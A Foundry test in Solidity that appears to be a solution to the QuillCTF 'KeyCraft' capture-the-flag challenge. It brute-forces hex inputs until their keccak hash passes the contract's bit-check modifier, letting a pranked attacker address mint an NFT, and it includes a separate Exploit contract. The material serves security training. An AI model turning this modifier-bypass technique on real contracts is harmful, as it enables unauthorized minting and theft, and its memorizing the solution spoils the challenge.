// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/KeyCraft.sol";

contract KeyCraftTest is Test {
    KeyCraft public keyCraft;
    Exploit public exploit;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = 0x2B82c473333012BC1a239bF59F93b9916cDf7486;
        console.log("attacker: ", attacker);
        vm.deal(attacker, 10 ether);

        vm.startPrank(deployer);
        keyCraft = new KeyCraft("KCNFT", "KC");
        vm.stopPrank();

        // vm.startPrank(attacker);
        // exploit = new Exploit{value: 1 ether}(keyCraft);
        // vm.stopPrank();
    }

    function testKeyCraftExploit() public {  
        // Before exploit
        assertEq(keyCraft.balanceOf(attacker), 0);

        // Exploit
        vm.startPrank(attacker, attacker);
        for (uint i = 0; i < 300000; i++) {
            console.log("i: ", i);
            bytes memory random = bytes(toHexString(i));
            if (canPassModifier(random)) {
                console.log("attacker: ", attacker);
                console.log("msg.sender: ", msg.sender);
                console.log("tx.origin: ", tx.origin);
                console.log(getAttackerAddress(random));
                keyCraft.mint(random);
            }
        }
        vm.stopPrank();

        // After exploit
        assertEq(keyCraft.balanceOf(attacker), 1);
    }

    function getAttackerAddress(bytes memory b) public pure returns (address) {
        uint a = uint160(uint256(keccak256(b)));
        return address(uint160(a));
    }


    function canPassModifier(bytes memory b) internal pure returns (bool) {
        bool w;
        uint a = uint160(uint256(keccak256(b)));

        a = a >> 108;
        a = a << 240;
        a = a >> 240;

        w = (a == 13057);
        return w;
    }

    function toHexString(uint a) public pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        revert();
    }
}

contract Exploit {
    KeyCraft public keyCraft;

    constructor(KeyCraft _keyCraft) payable {
        keyCraft = _keyCraft;
    }

    function attack() public {
        bytes memory b = hex"f39abb5bcdb5a4e635efe4fd5fdb9a88dc0f91181b1f9bf62d9df35b59ef6cae";
        keyCraft.mint{value: 1 ether}(b);
    }

}